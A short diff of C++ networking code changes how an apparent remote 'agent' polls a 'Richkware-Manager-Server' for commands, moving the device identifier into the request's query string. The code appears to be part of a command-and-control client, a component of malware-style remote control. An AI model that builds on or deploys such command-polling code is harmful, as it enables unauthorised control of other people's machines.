@@ -171,13 +171,12 @@ std::string Network::fetchCommand(const char *serverAddress, const char *port) {
     std::string srvAddr(serverAddress);
     std::string prt(port);
 
-    http::Request request("http://" + srvAddr + ":" + prt + "/Richkware-Manager-Server/command");
+    http::Request request(
+            "http://" + srvAddr + ":" + prt + "/Richkware-Manager-Server/command?data0=" + device + "&data1=agent");
 
-    std::string parameters = "{data0:\"" + device + "\",data1:\"agent\"}";
-    std::cout << parameters << std::endl;
-    http::Response response = request.send("GET", parameters, {
-            "Content-Type: application/json"
-    });
+//    std::string parameters = "{data0:\"" + device + "\",data1:\"agent\"}";
+//    std::cout << parameters << std::endl;
+    http::Response response = request.send("GET");
     std::string jsonResponse(response.body.begin(), response.body.end());
     if (jsonResponse.find("OK") != std::string::npos) {
         std::string delimiter = "\"message\":\"";
